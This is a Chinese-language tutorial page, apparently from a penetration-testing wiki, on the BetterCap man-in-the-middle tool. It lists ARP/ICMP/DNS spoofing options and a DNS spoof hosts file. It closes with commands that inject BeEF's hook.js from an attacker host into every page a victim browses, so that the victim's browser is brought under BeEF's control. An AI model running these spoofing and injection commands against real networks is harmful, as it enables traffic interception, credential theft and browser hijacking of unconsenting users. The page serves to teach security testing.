.. _bettercap:

==========
BetterCap
==========

BetterCap 是中间人攻击中的一种工具，用于替代知名但老旧的 :ref:`Ettercap <ettercap>`。

* 网站：https://www.bettercap.org/
* GitHub：https://github.com/evilsocket/bettercap

**一些主要功能包括：**

* 全双工和半双工 ARP 欺诈
* 真正的 **ICMP DoubleDirect** 欺诈实现
* 配置 DNS 欺诈
* 实时和完全的 automatized 主机发现
* 实时的认证证书协议的捕获，如 HTTP(S) 发布的数据，基本和数字认证 FTP, IRC, POP, IMAP, SMTP, NTLM ( HTTP, SMB, LDAP, etc ) 等等
* 完全自定义的网络嗅探器
* 模块化的 HTTP 和用户插件 + 内置插件注入自定义的 HTML 代码，JS 或 CSS 文件和 URL 支持的 HTTPS 透明代理
* SSLStripping
* 内置 HTTP 服务器

安装
==========

BetterCap 是 Ruby编写的，这意味着你将需要一个Ruby解释器 (> = 1.9)，并安装了 RubyGems 的环境

稳定版本 (GEM)
---------------

使用 ``gem install`` 轻松安装：
::

    gem install bettercap

更新到新版本：
::

    gem update bettercap

依赖
----------

所有的依赖性将通过 ``GEM`` 系统自动安装，在某些情况下，你可能需要自己安装这些本地的依赖性：
::

    apt-get install build-essential ruby-dev libpcap-dev

开发版本
----------

开发版本是最新的版本，你也可以从克隆GitHub的库的源代码，
这会给你所有最新和实验功能，但请记住，您使用的是潜在的不稳定版本：
::

    git clone https://github.com/evilsocket/bettercap.git
    cd bettercap
    bundle install
    gem build bettercap.gemspec
    sudo gem install bettercap*.gem

网络欺骗
==========

你可以针对整个局域网或单个目标

选项
----------

::

    -S, --spoofer NAME

欺骗者模块来使用，可得：ARP，ICMP，NONE，如果没有欺骗程序指定的默认​​（ARP）将被选择
::

    -T, --target ADDRESS1,ADDRESS2,...

针对指定的目标 IP 或 MAC 地址，在没有指定完整的子网情况下
::

    --ignore ADDRESS1,ADDRESS2

忽略指定的某些地址
::

    --dns FILE

启用 DNS 欺骗服务器，并指定一个文件作为一个主机解析表
::

    --dns-port PORT

设置 DNS 服务器的端口，默认为 ``5300`` 
::

    --kill

相反，转发数据包，这种交换机会将目标的连接被杀害。
::

    --no-spoofing

禁止欺骗，别名 ``--spoofer NONE``
::

    --half-duplex

启用半双工中间人，这将使 bettercap 工作在这种情况下，当路由器不容易（见下文）

DNS 欺骗
----------

如果要执行DNS欺骗，你必须指定 ``--dns FILE`` 命令行参数，这里的 **FILE** 值

是由类似下面的条目组成文件的名称：
::

    # Empty lines or lines starting with # will be ignored.
    
    # redirect *.google.com to the attacker ip address
    
    local .*google\.com
    
    # redirect *.microsoft.com to 10.10.10.10
    
    10.10.10.10 .*microsoft\.com

例子
----------

在一个局域网中启动时默认使用 ARP 欺诈方式：
::

    bettercap

::

    bettercap -S ICMP

::

    bettercap --dns ./hosts --httpd-port 80


组合 BeEF 框架使用
===================

在中间人攻击中对目标主机访问的每个网页中注入 :ref:`BeEF <beef>` 的 ``hook.js`` 使之可被 :ref:`BeEF <beef>` 控制。

启动 :ref:`BeEF <beef>` 框架
::

    cd /opt/beef-xss
    ./beef

记下你的 Hook URL (http://192.168.1.101:3000/hook.js)

打开另一个终端，启动 BetterCap (注意：替换成你的URL)
::

    bettercap --proxy-module injectjs --js-url "http://192.168.1.101:3000/hook.js"

如果你需要指定一个特定的目标，使用 ``-T`` 参数
::

    bettercap -T 192.168.1.102 --proxy-module injectjs --js-url "http://192.168.1.101:3000/hook.js"

BetterCap 将开始欺骗目标，将 JavaScript 注入到目标主机访问的每一个网页上

现在打开你的浏览器，登录到 BeEF 的控制台 (http://192.168.1.101:3000/ui/panel) ，如果一切正常，你应该能看到被控制的目标浏览器。
